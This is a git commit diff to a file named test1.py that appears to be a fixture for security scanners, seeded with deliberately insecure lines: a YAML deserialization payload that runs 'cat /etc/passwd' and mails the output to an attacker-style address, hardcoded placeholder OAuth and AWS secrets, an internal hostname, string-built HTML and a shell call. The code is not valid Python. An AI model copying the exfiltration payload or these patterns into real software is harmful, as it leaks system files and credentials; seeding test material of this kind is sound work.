fa4721c4ae23978a5d25cb8c22805cddc89b782a
alexan757 <127663794+alexan757@users.noreply.github.com>
2024-02-10 20:51:56 +0300

    Update test1.py

--- test1.py
+++ test1.py
@@ -7,8 +7,12 @@ def page():
 
     return output
     !!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
- 
+    
+    TWITTER_OAUTH_TOKEN = "dkedjekdjekldjekldje"
+    TWITTER_OAUTH_SECRET = "dkejkdjekdjkejdkjekdjekjdkjed"
+    AWS_CREDENTIALS = { 'key': 'djekjdkejde', 'secret': 'dncndmncdmncd' }
+    LOG_SERVER = "secret.logging.internal.mozilla.com"
+    response = "<html>%s</html>" % something
 
-#Jinja2
-import Jinja2
-Jinja2.from_string("Hello {{name}}!").render(name=name)
+import commands
+template_vars['output'] = commands.getstatusoutput('/usr/bin/process_soemthing')
